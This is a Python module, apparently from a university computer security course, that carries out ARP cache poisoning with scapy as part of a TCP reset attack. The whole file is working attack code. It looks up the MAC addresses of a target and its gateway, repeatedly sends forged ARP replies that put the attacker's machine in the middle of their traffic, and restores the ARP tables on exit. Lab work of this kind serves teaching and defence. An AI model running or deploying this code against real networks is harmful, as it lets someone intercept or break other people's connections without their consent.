#!/usr/bin/env python3
"""
ARP Poisoning Module for TCP Reset Attack
BUET CSE406 Computer Security Sessional
Educational Purpose Only
"""

import time
import threading
import signal
import sys
from scapy.all import send, sniff, get_if_hwaddr
from scapy.layers.l2 import ARP, Ether
from network_utils import NetworkUtils

class ARPPoisoner:
    def __init__(self, target_ip, gateway_ip, interface, interval=2):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.interval = interval
        
        self.target_mac = None
        self.gateway_mac = None
        self.attacker_mac = None
        
        self.running = False
        self.poison_thread = None
        
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        """Handle interrupt signals for graceful shutdown"""
        print(f"\n[ARP] Received signal {signum}, stopping ARP poisoning...")
        self.stop_poisoning()
    
    def discover_mac_addresses(self):
        """Discover MAC addresses of target and gateway"""
        print(f"[ARP] Discovering MAC addresses...")
        
        # Get target MAC
        self.target_mac = NetworkUtils.get_mac_address(self.target_ip, self.interface)
        if not self.target_mac:
            raise Exception(f"Could not discover MAC address for target {self.target_ip}")
        
        # Get gateway MAC
        self.gateway_mac = NetworkUtils.get_mac_address(self.gateway_ip, self.interface)
        if not self.gateway_mac:
            raise Exception(f"Could not discover MAC address for gateway {self.gateway_ip}")
        
        # Get attacker's MAC (our interface MAC)
        try:
            self.attacker_mac = NetworkUtils.get_local_mac_address(self.interface)
            if not self.attacker_mac:
                raise Exception(f"Could not get MAC address for interface {self.interface}")
        except Exception as e:
            raise Exception(f"Could not get MAC address for interface {self.interface}: {e}")
        
        print(f"[ARP] Target {self.target_ip} -> {self.target_mac}")
        print(f"[ARP] Gateway {self.gateway_ip} -> {self.gateway_mac}")
        print(f"[ARP] Attacker {self.interface} -> {self.attacker_mac}")
    
    def create_poison_packet(self, victim_ip, victim_mac, spoof_ip):
        """Create ARP poison packet"""
        # ARP reply: "spoof_ip is at attacker_mac"
        packet = ARP(
            op=2,                    # ARP reply
            pdst=victim_ip,          # Victim IP
            hwdst=victim_mac,        # Victim MAC
            psrc=spoof_ip,           # IP we're spoofing
            hwsrc=self.attacker_mac  # Our MAC
        )
        return packet
    
    def send_poison_packets(self):
        """Send ARP poison packets to both target and gateway"""
        try:
            # Tell target: "I am the gateway"
            poison_target = self.create_poison_packet(
                self.target_ip, self.target_mac, self.gateway_ip
            )
            
            # Tell gateway: "I am the target"
            poison_gateway = self.create_poison_packet(
                self.gateway_ip, self.gateway_mac, self.target_ip
            )
            
            # Send packets
            send(poison_target, verbose=False, iface=self.interface)
            send(poison_gateway, verbose=False, iface=self.interface)
            
            return True
            
        except Exception as e:
            print(f"[ARP] Error sending poison packets: {e}")
            return False
    
    def restore_arp_tables(self):
        """Restore original ARP entries"""
        print(f"[ARP] Restoring ARP tables...")
        
        try:
            # Restore target's ARP table: gateway_ip is at gateway_mac
            restore_target = ARP(
                op=2,
                pdst=self.target_ip,
                hwdst=self.target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac
            )
            
            # Restore gateway's ARP table: target_ip is at target_mac
            restore_gateway = ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.target_ip,
                hwsrc=self.target_mac
            )
            
            # Send restoration packets multiple times
            for _ in range(5):
                send(restore_target, verbose=False, iface=self.interface)
                send(restore_gateway, verbose=False, iface=self.interface)
                time.sleep(0.5)
            
            print(f"[ARP] ARP tables restored")
            
        except Exception as e:
            print(f"[ARP] Error restoring ARP tables: {e}")
    
    def _poison_loop(self):
        """Main ARP poisoning loop"""
        print(f"[ARP] Starting ARP poisoning (interval: {self.interval}s)")
        
        packet_count = 0
        
        while self.running:
            try:
                if self.send_poison_packets():
                    packet_count += 2  # Two packets sent
                    print(f"[ARP] Poisoning packets sent: {packet_count}", end='\r')
                
                time.sleep(self.interval)
                
            except Exception as e:
                print(f"\n[ARP] Error in poison loop: {e}")
                break
        
        print(f"\n[ARP] Poisoning loop stopped (total packets: {packet_count})")
    
    def start_poisoning(self):
        """Start ARP poisoning in background thread"""
        if self.running:
            print("[ARP] ARP poisoning already running")
            return False
        
        try:
            # Discover MAC addresses first
            self.discover_mac_addresses()
            
            # Start poisoning thread
            self.running = True
            self.poison_thread = threading.Thread(target=self._poison_loop, daemon=True)
            self.poison_thread.start()
            
            print("[ARP] ARP poisoning started successfully")
            return True
            
        except Exception as e:
            print(f"[ARP] Failed to start ARP poisoning: {e}")
            self.running = False
            return False
    
    def stop_poisoning(self):
        """Stop ARP poisoning and restore ARP tables"""
        if not self.running:
            print("[ARP] ARP poisoning not running")
            return
        
        print("[ARP] Stopping ARP poisoning...")
        self.running = False
        
        # Wait for poison thread to finish
        if self.poison_thread and self.poison_thread.is_alive():
            self.poison_thread.join(timeout=5)
        
        # Restore ARP tables
        if self.target_mac and self.gateway_mac:
            self.restore_arp_tables()
        
        print("[ARP] ARP poisoning stopped")
    
    def is_running(self):
        """Check if ARP poisoning is currently running"""
        return self.running
    
    def get_status(self):
        """Get current ARP poisoning status"""
        return {
            'running': self.running,
            'target_ip': self.target_ip,
            'target_mac': self.target_mac,
            'gateway_ip': self.gateway_ip,
            'gateway_mac': self.gateway_mac,
            'interface': self.interface,
            'interval': self.interval
        }

def test_arp_poisoner():
    """Test ARP poisoner functionality"""
    print("=== ARP Poisoner Test ===")
    
    # Test configuration
    target_ip = "192.168.1.100"    # Replace with actual target
    gateway_ip = "192.168.1.1"     # Replace with actual gateway
    interface = "eth0"              # Replace with actual interface
    
    poisoner = ARPPoisoner(target_ip, gateway_ip, interface, interval=3)
    
    try:
        # Test MAC discovery only
        poisoner.discover_mac_addresses()
        status = poisoner.get_status()
        print(f"ARP Poisoner Status: {status}")
        
    except Exception as e:
        print(f"Test failed: {e}")

if __name__ == "__main__":
    test_arp_poisoner()
